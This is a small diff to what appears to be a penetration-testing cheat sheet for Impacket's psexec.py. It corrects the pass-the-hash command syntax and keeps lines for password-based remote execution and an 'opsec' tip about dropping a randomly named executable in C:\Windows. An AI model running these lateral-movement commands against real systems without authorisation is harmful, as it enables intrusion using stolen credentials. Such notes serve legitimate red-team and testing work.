@@ -2,7 +2,7 @@
 python psexec.py <domain>/<user>:<password>@<rhost>
 
 # using hash (hash must be: lmhash:nthash)
-python psexec.py -hashes:<hash> <domain>/<user>@<rhost>
+python psexec.py -hashes :<ntlmhash> <domain>/<user>@<rhost>
 
 # opsec considerations
 upload randomly named exe file to C:\Windows
